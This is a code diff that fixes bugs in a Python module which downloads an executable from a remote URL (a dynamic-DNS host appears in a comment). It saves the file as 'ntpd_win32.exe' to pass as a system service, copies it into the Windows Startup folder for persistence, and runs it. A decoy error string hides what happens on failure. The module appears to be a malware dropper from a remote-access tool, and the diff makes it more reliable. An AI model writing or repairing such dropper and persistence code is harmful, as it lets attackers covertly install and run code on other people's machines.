@@ -41,7 +41,7 @@ def run(**args):
         bin = True
         ScriptExec = "python"
         url = "http://192.168.2.112:8000/nj"   #"http://saw-dsr.ddns.net:8000/nj"
-        OsTargetpath = os.getenv("PUBLIC")+ "\ntpd_win32.exe"
+        OsTargetpath = os.getenv("PUBLIC")+ "\\ntpd_win32.exe"
 
     elif os.name == 'posix':
         bin = True
@@ -74,14 +74,14 @@ def run(**args):
         mon_fichier.close()
         if os.name == 'nt' and winRunOnBoot == True:
             startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
-            os.system("copy %s %s"%(OsTargetpath, startPath))
+            os.system("copy \"%s\" \"%s\""%(targetPath, startPath))
     except:
         print("[Error] getFileFromURI: could not create Targetscript")
         return " modules/_bootlocale not found!!"
 
     if start and os.name == 'nt': #TODO: check how to start python script
         if bin:
-            os.system("start '{}'".format(OsTargetpath.replace('/','\\')))
+            os.system("start {}".format(OsTargetpath.replace('/','\\')))
         else:
             os.system(scriptExec+" "+OsTargetpath)
     elif start and os.name == 'posix':
